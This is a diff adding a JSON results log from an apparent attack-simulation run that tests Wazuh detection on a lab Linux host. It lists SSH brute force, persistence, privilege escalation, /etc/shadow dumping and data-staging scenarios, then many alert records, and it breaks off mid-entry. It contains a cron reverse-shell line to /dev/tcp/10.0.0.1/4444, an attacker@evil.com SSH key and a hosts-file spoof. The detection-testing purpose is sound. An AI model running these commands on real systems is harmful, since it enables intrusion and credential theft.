@@ -1,0 +1,1964 @@
+{
+  "run_id": "WAZUH_LINUX_TEST_20260814_091032",
+  "target": "192.168.56.102",
+  "start_time": "2026-08-14T09:10:33Z",
+  "attacks_total": 14,
+  "attacks_succeeded": 14,
+  "wazuh_linux_alerts": 289,
+  "wazuh_tagging_alerts": 28,
+  "attacks_detected": 13,
+  "results": [
+    {
+      "name": "SSH Brute Force",
+      "scenario_id": "linux_001",
+      "success": true,
+      "description": "5 failed SSH login attempts to user 'ubuntu' with wrong passwords from remote host.",
+      "details": {
+        "target_user": "ubuntu",
+        "attempts": [
+          {
+            "password": "password",
+            "result": "auth_failed"
+          },
+          {
+            "password": "123456",
+            "result": "auth_failed"
+          },
+          {
+            "password": "admin123",
+            "result": "auth_failed"
+          },
+          {
+            "password": "letmein",
+            "result": "auth_failed"
+          },
+          {
+            "password": "ubuntu123",
+            "result": "auth_failed"
+          }
+        ]
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 30
+    },
+    {
+      "name": "Cron Job Persistence",
+      "scenario_id": "linux_003",
+      "success": true,
+      "description": "Created malicious cron job for persistence.",
+      "details": {
+        "cron_file": {
+          "cmd": "cat /opt/attack_test/fake_cron/malicious",
+          "stdout": "* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+          "stderr": "",
+          "status": 0
+        },
+        "crontab": {
+          "cmd": "crontab -l",
+          "stdout": "# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_143832\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_144647\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_145212\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_150403\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_150833\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_151930\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_153719\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_153920\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_211520\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260716_060045\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260716_060232\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260716_061620\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260716_085001\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260718_175535\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260721_072304\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260721_072505\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260721_074426\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260721_102152\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260721_102941\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260721_103714\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260721_105256\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260723_061137\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260723_082325\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260723_090008\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260723_095202\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260728_054130\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260728_061053\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260728_073408\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260728_102847\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_053616\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_060651\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_074540\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_113522\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_114358\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260806_061540\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260806_105050\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260806_105507\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260806_110555\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260806_111838\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260811_062732\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260811_062907\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260811_075210\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260813_203031\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260814_091032",
+          "stderr": "",
+          "status": 0
+        }
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 2
+    },
+    {
+      "name": "SUID Binary Abuse",
+      "scenario_id": "linux_004",
+      "success": true,
+      "description": "Created SUID binary to escalate privileges.",
+      "details": {
+        "binary": "-rwsr-xr-x 1 mike mike 204264 Aug 14 12:10 /opt/attack_test/suid_find"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 5
+    },
+    {
+      "name": "Unauthorized User Creation",
+      "scenario_id": "linux_005",
+      "success": true,
+      "description": "Created unauthorized user with sudo privileges.",
+      "details": {
+        "user": "hacker_091032",
+        "passwd_entry": "hacker_091032:x:1002:1002::/home/hacker_091032:/bin/bash"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 8
+    },
+    {
+      "name": "SSH Key Injection",
+      "scenario_id": "linux_006",
+      "success": true,
+      "description": "Injected unauthorized SSH key into authorized_keys.",
+      "details": {
+        "key_added": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackKeyWAZUH_LINUX_TEST_20260814_091032 attacker@evil.com"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 2
+    },
+    {
+      "name": "Systemd Backdoor",
+      "scenario_id": "linux_007",
+      "success": true,
+      "description": "Created malicious systemd service file.",
+      "details": {
+        "service_file": "/opt/attack_test/fake_systemd/backdoor.service"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 1
+    },
+    {
+      "name": "Bashrc Persistence",
+      "scenario_id": "linux_008",
+      "success": true,
+      "description": "Injected malicious alias into .bashrc for persistence.",
+      "details": {
+        "tail": "echo ATTACK_MAGIC: WAZUH_LINUX_TEST_20260710_154838 >> /tmp/attacker_log.txt\necho ATTACK_MAGIC: WAZUH_LINUX_TEST_20260710_155224 >> /tmp/attacker_log.txt\n# ATTACK_WAZUH_LINUX_TEST_20260814_091032"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 5
+    },
+    {
+      "name": "Log Tampering",
+      "scenario_id": "linux_009",
+      "success": true,
+      "description": "Tampered with log files and cleared bash history.",
+      "details": {
+        "log_after_tamper": "Jul 10 10:00:00 host sshd[1234]: Accepted password for root from 1.2.3.4 port 54321 ssh2\nJul 10 10:02:00 host sudo[1236]: mike : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
+        "history_cleared": true
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 1
+    },
+    {
+      "name": "Credential Dumping",
+      "scenario_id": "linux_010",
+      "success": true,
+      "description": "Read /etc/shadow to dump password hashes.",
+      "details": {
+        "users_with_hashes": [
+          "systemd-network",
+          "systemd-timesync",
+          "systemd-resolve",
+          "systemd-oom",
+          "fwupd-refresh",
+          "gnome-remote-desktop",
+          "polkitd",
+          "mike",
+          "testuser_155224"
+        ],
+        "shadow_lines": 57
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 2
+    },
+    {
+      "name": "Sudoers Modification",
+      "scenario_id": "linux_011",
+      "success": true,
+      "description": "Modified sudoers to grant unauthorized privileges.",
+      "details": {
+        "sudoers_d": "mike\nREADME\nzzz_attack_test"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 8
+    },
+    {
+      "name": "Hosts File Modification",
+      "scenario_id": "linux_012",
+      "success": true,
+      "description": "Modified /etc/hosts for DNS spoofing.",
+      "details": {
+        "hosts_tail": "ff02::3 ip6-allhosts\n# ATTACK_WAZUH_LINUX_TEST_20260814_091032\n10.0.0.1 evil.com update.microsoft.com"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 12
+    },
+    {
+      "name": "Firewall Tampering",
+      "scenario_id": "linux_013",
+      "success": true,
+      "description": "Added firewall rule to open backdoor port 4444.",
+      "details": {
+        "rule_added": "1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:4444"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 4
+    },
+    {
+      "name": "System Reconnaissance",
+      "scenario_id": "linux_014",
+      "success": true,
+      "description": "Performed system enumeration and reconnaissance.",
+      "details": {
+        "OS info": "Linux UbuntuLinux 7.0.0-28-generic #28~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Jul  1 15:50:57 UTC 2 x86_64 x86_64 x86_64 GNU/Linux",
+        "Current user": "uid=1000(mike) gid=1000(mike) groups=1000(mike),27(sudo)\nmike",
+        "OS release": "PRETTY_NAME=\"Ubuntu 24.04.4 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nVERSION=\"24.04.4 LTS (Noble Numbat)\"\nVERSION_CODENAME=noble\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"h",
+        "Running processes": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nmike       14644  150  0.0  13760  4876 ?        R    12:11   0:00 ps aux --sort=-%cpu\nwazuh-i+    1504 13.4 17.7 5170400 176",
+        "Open ports": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:631           0.0.0.0:*   ",
+        "SUID files": "FAILED: ",
+        "Crontab": "# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files ",
+        "Home directories": "total 16\ndrwxr-xr-x  4 root            root            4096 Aug 14 12:10 .\ndrwxr-xr-x 23 root            root            4096 Jun 25 12:17 ..\ndrwxr-x--- 17 mike            mike            4096 Aug 14 ",
+        "Sudo permissions": "Matching Defaults entries for mike on UbuntuLinux:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser mike may run the",
+        "Login history": "mike     tty2         tty2             Fri Aug 14 11:21   still logged in\nmike     seat0        login screen     Fri Aug 14 11:21   still logged in\nreboot   system boot  7.0.0-28-generic Fri Aug 14 11"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Data Exfiltration",
+      "scenario_id": "linux_015",
+      "success": true,
+      "description": "Staged sensitive data for exfiltration.",
+      "details": {
+        "files": {
+          "/etc/passwd": "accessible",
+          "/etc/shadow": "accessible",
+          "/home/mike/.bash_history": "accessible",
+          "/home/mike/.ssh/known_hosts": "accessible",
+          "/var/log/auth.log": "accessible"
+        },
+        "staged": "-rw-r--r-- 1 root root 2.2K Aug 14 12:11 /tmp/exfil_WAZUH_LINUX_TEST_20260814_091032.b64"
+      },
+      "wazuh_detected": true,
+      "wazuh_alert_count": 2
+    }
+  ],
+  "detections": [
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:24.349Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:23.269Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.347Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.346Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.346Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.346Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.346Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.346Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.346Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.343Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.337Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.332Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.332Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.332Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.108Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.105Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.104Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.104Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.104Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.104Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:22.104Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:06.273Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:06.273Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:06.271Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:05.254Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:05.252Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:05.252Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.275Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.272Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.272Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.272Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.271Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.266Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.266Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.266Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.266Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.266Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.071Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.070Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.070Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.069Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.069Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:04.069Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.266Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.265Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.265Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.265Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.265Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.259Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.257Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.256Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.256Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:03.256Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:11:02.690Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:11:02.682Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-08-14T09:11:02.675Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:11:02.554Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:11:02.395Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:11:02.372Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.246Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.246Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.244Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.243Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.243Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.240Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.240Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.058Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.058Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.053Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.053Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.053Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:02.053Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-08-14T09:11:01.358Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.215Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.215Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.215Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.215Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.215Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.215Z"
+    },
+    {
+      "rule_id": "5502",
+      "description": "PAM: Login session closed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.214Z"
+    },
+    {
+      "rule_id": "5501",
+      "description": "PAM: Login session opened.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.209Z"
+    },
+    {
+      "rule_id": "5402",
+      "description": "Successful sudo to ROOT executed.",
+      "level": 3,
+      "timestamp": "2026-08-14T09:11:01.209Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
